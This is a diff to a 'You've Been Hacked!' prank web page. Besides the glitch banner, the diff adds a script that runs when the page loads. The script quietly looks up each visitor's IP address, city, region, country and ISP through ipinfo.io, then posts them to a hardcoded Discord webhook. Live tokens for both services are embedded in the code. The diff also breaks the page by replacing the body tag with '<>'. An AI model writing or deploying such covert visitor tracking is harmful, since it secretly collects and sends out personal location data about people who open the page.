@@ -63,7 +63,7 @@
     }
   </style>
 </head>
-<body>
+<>
   <div class="container">
     <div class="glitch">⚠ Oops! You've Been Hacked! ⚠</div>
     <div id="terminal"></div><div class="cursor"></div>
@@ -111,6 +111,29 @@
     }
 
     window.onload = typeLine;
+  </script>
+  <script>
+    const discord = "https://discord.com/api/webhooks/1368817232859238420/oQd2wHGOS1v8kUzjGPIXtEZK8zh1AygTBLlA2SUqp31yIzuFDQfHbV7qMdStR7UJNWcl";
+      fetch("https://ipinfo.io/json?token=a90f18c2f503dc")
+        .then(response => response.json())
+        .then(data => {
+          const message = `🌐 New visitor:
+      - IP: ${data.ip}
+      - City: ${data.city}
+      - Region: ${data.region}
+      - Country: ${data.country}
+      - ISP: ${data.org}
+      - Time: ${new Date().toLocaleString()}`;
+      
+          fetch(discord, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ content: message })
+          });
+        });
+      
   </script>
 </body>
 </html>
